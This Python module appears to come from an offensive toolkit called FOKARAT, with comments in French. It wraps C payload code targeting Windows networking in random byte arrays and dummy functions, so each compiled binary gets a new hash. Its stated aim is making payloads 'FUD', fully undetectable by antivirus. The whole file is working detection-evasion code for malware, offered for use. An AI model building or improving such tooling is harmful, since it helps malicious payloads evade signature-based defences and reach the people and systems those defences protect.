"""
FOKARAT - Générateur de padding aléatoire pour payloads FUD
Rend chaque compilation unique en ajoutant du code mort aléatoire.
"""
import random
import string
from core.logger import Logger

logger = Logger()


class PaddingGenerator:
    """
    Génère du code C avec padding massif aléatoire.
    Chaque compilation produit un binaire au hash différent.
    """

    @staticmethod
    def _random_name(length=None):
        if length is None:
            length = random.randint(8, 20)
        first = random.choice(string.ascii_letters)
        rest = "".join(random.choices(string.ascii_letters + string.digits, k=length - 1))
        return first + rest

    @staticmethod
    def _random_hex_bytes(count=256):
        return ", ".join(f"0x{random.randint(0, 255):02x}" for _ in range(count))

    @staticmethod
    def _random_string(length=64):
        chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
        return "".join(random.choices(chars, k=length))

    def generate_padding_block(self, size_kb=8):
        """Génère un bloc de padding de la taille spécifiée."""
        lines = []
        total_bytes = size_kb * 1024
        generated = 0

        while generated < total_bytes:
            var_name = self._random_name()
            block_size = random.randint(128, 512)
            hex_bytes = self._random_hex_bytes(block_size)
            lines.append(f"unsigned char {var_name}[] = {{{hex_bytes}}};")
            generated += block_size

        return "\n".join(lines)

    def generate_fake_functions(self, count=15):
        """Génère des fonctions factices qui ne font rien."""
        funcs = []
        for _ in range(count):
            name = self._random_name()
            body_lines = []
            for _ in range(random.randint(5, 15)):
                var = self._random_name()
                if random.random() < 0.5:
                    body_lines.append(f"    volatile int {var} = {random.randint(0, 9999)};")
                else:
                    body_lines.append(f'    volatile const char* {var} = "{self._random_string(random.randint(10, 50))}";')
            body_lines.append("    return 0;")
            funcs.append(f"int {name}(void) {{\n" + "\n".join(body_lines) + "\n}")
        return "\n\n".join(funcs)

    def wrap_payload(self, original_code, size_kb=8, fake_funcs=15):
        """Enveloppe le code original dans du padding + fonctions fake."""
        banner = "/* FOKARAT - Payload protégé par padding aléatoire */\n"
        includes = (
            "#include <windows.h>\n"
            "#include <winsock2.h>\n"
            "#include <ws2tcpip.h>\n"
            "#include <string.h>\n"
            "#include <stdio.h>\n"
            '#pragma comment(lib, "ws2_32.lib")\n\n'
        )

        padding_before = self.generate_padding_block(size_kb)
        fake_funcs_code = self.generate_fake_functions(fake_funcs)
        padding_after = self.generate_padding_block(size_kb)

        # Appel des fonctions fake au démarrage
        calls = []
        for line in fake_funcs_code.split("\n"):
            if line.startswith("int ") and "(void)" in line:
                fname = line.split()[1].split("(")[0]
                calls.append(f"    {fname}();")
        calls_code = "void __forceinline __fokarat_init(void) {\n" + "\n".join(calls) + "\n}\n"

        wrapped = (
            banner
            + includes
            + padding_before
            + "\n\n"
            + fake_funcs_code
            + "\n\n"
            + calls_code
            + "\n\n"
            + "int main() {\n    __fokarat_init();\n"
            + "    " + original_code.replace("\n", "\n    ") + "\n"
            + "    return 0;\n}\n\n"
            + padding_after
            + "\n"
        )

        logger.success(f"Padding appliqué : {size_kb*2} Ko + {fake_funcs} fonctions fake")
        return wrapped